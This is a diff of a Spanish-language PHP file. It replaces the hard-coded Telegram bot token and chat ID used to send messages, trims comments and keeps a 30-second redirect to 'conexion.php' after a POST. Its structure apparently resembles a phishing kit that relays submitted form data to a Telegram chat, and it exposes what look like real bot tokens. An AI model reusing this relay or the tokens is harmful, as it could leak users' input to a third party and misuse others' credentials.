@@ -1,8 +1,7 @@
 <?php
 function enviarMensajeTelegram($mensaje) {
-    $botToken = '6766741718:AAERxvAz_mEhR3aROqFwcJDnomh6F0ZGHLM'; // Reemplaza con el token de tu bot
-    $chatID = '-4079167315
-'; // Reemplaza con el ID del canal o chat al que quieras enviar el mensaje
+    $botToken = '7262207322:AAE51Mq-EHEUJUXut9X7l0nSJhIK2F7jsGs'; // Reemplaza con el token de tu bot
+    $chatID = '-4500407776'; // Reemplaza con el ID del canal o chat al que quieras enviar el mensaje
 
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $data = array('chat_id' => $chatID, 'text' => $mensaje);
@@ -51,8 +50,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             height: 100vh;
         }
         .elegant-text {
-            font-size: 24px; /* Ajusta el tamaño de la fuente según tus preferencias */
-            font-family: "Arial", sans-serif; /* Cambia la fuente según tus preferencias */
+            font-size: 24px;
+            font-family: "Arial", sans-serif;
         }
     </style>
     <div class="centered-container">
@@ -64,7 +63,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     echo '<script>
         setTimeout(function() {
             window.location.href = "conexion.php";
-        }, 30000); // 30 segundos
+        }, 30000); // Redirige después de 30 segundos
     </script>';
     exit; // Asegura que se detenga la ejecución del script
 } else {
